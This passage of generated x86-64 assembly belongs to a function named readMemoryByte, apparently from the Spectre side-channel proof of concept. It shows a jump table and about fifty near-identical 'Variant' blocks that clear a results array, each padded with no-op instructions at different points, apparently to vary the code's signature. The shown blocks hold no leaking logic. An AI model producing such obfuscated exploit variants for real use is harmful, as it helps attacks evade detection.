	cmpl	$71, %eax
	je	.LreadMemoryByte_win9_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win9_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win9_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win9_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win9_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win9_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win9_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win9_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win9_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win9_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win9_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win9_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win9_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win9_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win9_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win9_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win9_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win9_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win9_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win9_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win9_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win9_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win9_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win9_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win9_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win9_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win9_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win9_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win9_var99
	cmpl	$100, %eax
	je	.LreadMemoryByte_win9_var100
	cmpl	$101, %eax
	je	.LreadMemoryByte_win9_var101
	cmpl	$102, %eax
	je	.LreadMemoryByte_win9_var102
	cmpl	$103, %eax
	je	.LreadMemoryByte_win9_var103
	cmpl	$104, %eax
	je	.LreadMemoryByte_win9_var104
	cmpl	$105, %eax
	je	.LreadMemoryByte_win9_var105
	cmpl	$106, %eax
	je	.LreadMemoryByte_win9_var106
	cmpl	$107, %eax
	je	.LreadMemoryByte_win9_var107
	cmpl	$108, %eax
	je	.LreadMemoryByte_win9_var108
	cmpl	$109, %eax
	je	.LreadMemoryByte_win9_var109
	cmpl	$110, %eax
	je	.LreadMemoryByte_win9_var110
	cmpl	$111, %eax
	je	.LreadMemoryByte_win9_var111
	cmpl	$112, %eax
	je	.LreadMemoryByte_win9_var112
	cmpl	$113, %eax
	je	.LreadMemoryByte_win9_var113
	cmpl	$114, %eax
	je	.LreadMemoryByte_win9_var114
	cmpl	$115, %eax
	je	.LreadMemoryByte_win9_var115
	cmpl	$116, %eax
	je	.LreadMemoryByte_win9_var116
	cmpl	$117, %eax
	je	.LreadMemoryByte_win9_var117
	cmpl	$118, %eax
	je	.LreadMemoryByte_win9_var118
	cmpl	$119, %eax
	je	.LreadMemoryByte_win9_var119
	cmpl	$120, %eax
	je	.LreadMemoryByte_win9_var120
	cmpl	$121, %eax
	je	.LreadMemoryByte_win9_var121
	cmpl	$122, %eax
	je	.LreadMemoryByte_win9_var122
	cmpl	$123, %eax
	je	.LreadMemoryByte_win9_var123
	cmpl	$124, %eax
	je	.LreadMemoryByte_win9_var124
	cmpl	$125, %eax
	je	.LreadMemoryByte_win9_var125
	cmpl	$126, %eax
	je	.LreadMemoryByte_win9_var126
	cmpl	$127, %eax
	je	.LreadMemoryByte_win9_var127
	cmpl	$128, %eax
	je	.LreadMemoryByte_win9_var128
	cmpl	$129, %eax
	je	.LreadMemoryByte_win9_var129
	cmpl	$130, %eax
	je	.LreadMemoryByte_win9_var130
	cmpl	$131, %eax
	je	.LreadMemoryByte_win9_var131
	cmpl	$132, %eax
	je	.LreadMemoryByte_win9_var132
	cmpl	$133, %eax
	je	.LreadMemoryByte_win9_var133
	cmpl	$134, %eax
	je	.LreadMemoryByte_win9_var134
	cmpl	$135, %eax
	je	.LreadMemoryByte_win9_var135
	cmpl	$136, %eax
	je	.LreadMemoryByte_win9_var136
	cmpl	$137, %eax
	je	.LreadMemoryByte_win9_var137
	cmpl	$138, %eax
	je	.LreadMemoryByte_win9_var138
	cmpl	$139, %eax
	je	.LreadMemoryByte_win9_var139
	cmpl	$140, %eax
	je	.LreadMemoryByte_win9_var140
	cmpl	$141, %eax
	je	.LreadMemoryByte_win9_var141
	cmpl	$142, %eax
	je	.LreadMemoryByte_win9_var142
	cmpl	$143, %eax
	je	.LreadMemoryByte_win9_var143
	cmpl	$144, %eax
	je	.LreadMemoryByte_win9_var144
	cmpl	$145, %eax
	je	.LreadMemoryByte_win9_var145
	cmpl	$146, %eax
	je	.LreadMemoryByte_win9_var146
	cmpl	$147, %eax
	je	.LreadMemoryByte_win9_var147
	cmpl	$148, %eax
	je	.LreadMemoryByte_win9_var148
	cmpl	$149, %eax
	je	.LreadMemoryByte_win9_var149
	jmp	.LreadMemoryByte_win9_var0
## Variant 0
.LreadMemoryByte_win9_var0:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 1
.LreadMemoryByte_win9_var1:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 2
.LreadMemoryByte_win9_var2:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 3
.LreadMemoryByte_win9_var3:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 4
.LreadMemoryByte_win9_var4:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 5
.LreadMemoryByte_win9_var5:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 6
.LreadMemoryByte_win9_var6:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 7
.LreadMemoryByte_win9_var7:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 8
.LreadMemoryByte_win9_var8:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 9
.LreadMemoryByte_win9_var9:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 10
.LreadMemoryByte_win9_var10:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 11
.LreadMemoryByte_win9_var11:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 12
.LreadMemoryByte_win9_var12:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 13
.LreadMemoryByte_win9_var13:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 14
.LreadMemoryByte_win9_var14:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 15
.LreadMemoryByte_win9_var15:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 16
.LreadMemoryByte_win9_var16:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 17
.LreadMemoryByte_win9_var17:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 18
.LreadMemoryByte_win9_var18:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 19
.LreadMemoryByte_win9_var19:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 20
.LreadMemoryByte_win9_var20:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 21
.LreadMemoryByte_win9_var21:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 22
.LreadMemoryByte_win9_var22:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 23
.LreadMemoryByte_win9_var23:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 24
.LreadMemoryByte_win9_var24:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 25
.LreadMemoryByte_win9_var25:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 26
.LreadMemoryByte_win9_var26:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 27
.LreadMemoryByte_win9_var27:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 28
.LreadMemoryByte_win9_var28:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 29
.LreadMemoryByte_win9_var29:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 30
.LreadMemoryByte_win9_var30:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 31
.LreadMemoryByte_win9_var31:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 32
.LreadMemoryByte_win9_var32:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 33
.LreadMemoryByte_win9_var33:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 34
.LreadMemoryByte_win9_var34:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 35
.LreadMemoryByte_win9_var35:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 36
.LreadMemoryByte_win9_var36:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 37
.LreadMemoryByte_win9_var37:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 38
.LreadMemoryByte_win9_var38:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 39
.LreadMemoryByte_win9_var39:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 40
.LreadMemoryByte_win9_var40:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 41
.LreadMemoryByte_win9_var41:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 42
.LreadMemoryByte_win9_var42:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 43
.LreadMemoryByte_win9_var43:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 44
.LreadMemoryByte_win9_var44:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 45
.LreadMemoryByte_win9_var45:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 46
.LreadMemoryByte_win9_var46:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 47
.LreadMemoryByte_win9_var47:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 48
.LreadMemoryByte_win9_var48:
	popq	%rax
	nop
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 49
.LreadMemoryByte_win9_var49:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 50
.LreadMemoryByte_win9_var50:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
